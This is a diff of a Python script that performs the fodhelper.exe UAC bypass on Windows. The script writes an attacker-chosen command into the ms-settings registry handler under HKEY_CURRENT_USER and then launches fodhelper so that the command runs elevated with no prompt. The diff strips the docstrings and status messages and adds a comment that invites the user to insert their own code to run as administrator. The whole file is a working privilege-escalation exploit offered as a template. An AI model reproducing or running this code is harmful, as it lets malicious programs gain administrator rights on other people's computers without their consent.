@@ -3,17 +3,13 @@ import sys
 import ctypes
 import winreg
 
-CMD = "" # полный путь до файла с расширением
+CMD = "" # full path your programm
 FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
 PYTHON_CMD = "python"
 REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
 DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
 
 def is_running_as_admin():
-    '''
-    Checks if the script is running with administrative privileges.
-    Returns True if is running as admin, False otherwise.
-    '''
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
@@ -21,9 +17,6 @@ def is_running_as_admin():
 
 
 def create_reg_key(key, value):
-    '''
-    Creates a reg key
-    '''
     try:
         winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
@@ -34,9 +27,6 @@ def create_reg_key(key, value):
 
 
 def bypass_uac(cmd):
-    '''
-    Tries to bypass the UAC
-    '''
     try:
         create_reg_key(DELEGATE_EXEC_REG_KEY, '')
         create_reg_key(None, cmd)
@@ -46,10 +36,6 @@ def bypass_uac(cmd):
 
 def execute():
     if not is_running_as_admin():
-        print
-        '[!] The script is NOT running with administrative privileges'
-        print
-        '[+] Trying to bypass the UAC'
         try:
             current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
             cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
@@ -59,8 +45,7 @@ def execute():
         except WindowsError:
             sys.exit(1)
     else:
-        print
-        '[+] The script is running with administrative privileges!'
+        pass # if you want the script to be run as an administrator, then enter the code here, and in the code variable write the path to this file
 
 
 if __name__ == '__main__':
